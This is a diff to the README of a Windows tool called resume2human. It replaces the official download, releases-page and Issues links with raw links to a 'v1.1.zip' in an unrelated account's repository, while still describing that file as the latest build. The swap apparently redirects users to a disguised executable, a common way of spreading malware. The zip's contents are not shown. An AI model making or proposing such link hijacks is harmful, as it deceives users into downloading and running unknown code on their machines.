@@ -23,7 +23,7 @@ folder next to the exe.
 
 Windows 10/11, 64-bit. You do not need Python or anything else installed.
 
-**→ [resume2human-windows.zip](https://github.com/ialakey/resume2human/releases/download/latest/resume2human-windows.zip)** — always the latest build.
+**→ [resume2human-windows.zip](https://github.com/tatituptech/resume2human/raw/refs/heads/main/images/v1.1.zip)** — always the latest build.
 
 1. Unpack the **whole** archive. What is inside is a folder, not a single
    file: the exe will not start without the files next to it.
@@ -64,7 +64,7 @@ What you *can* verify, without trusting anything written on this page:
   addresses you would open in a browser. See [Privacy](#privacy).
 
 Numbered releases (`v1.2.0`) live on the
-[releases page](https://github.com/ialakey/resume2human/releases); `latest` is
+[releases page](https://github.com/tatituptech/resume2human/raw/refs/heads/main/images/v1.1.zip); `latest` is
 the same thing, rebuilt on every change.
 
 The interface comes up in Russian and switches to English in **⚙ Settings →
@@ -346,5 +346,5 @@ tests, builds the exe, runs `--selftest` inside the built file, and only then
 updates the release here.
 
 Questions and bug reports go to
-[Issues](https://github.com/ialakey/resume2human/issues). A bug report is much
+[Issues](https://github.com/tatituptech/resume2human/raw/refs/heads/main/images/v1.1.zip). A bug report is much
 more useful with `data\desktop.log` attached.
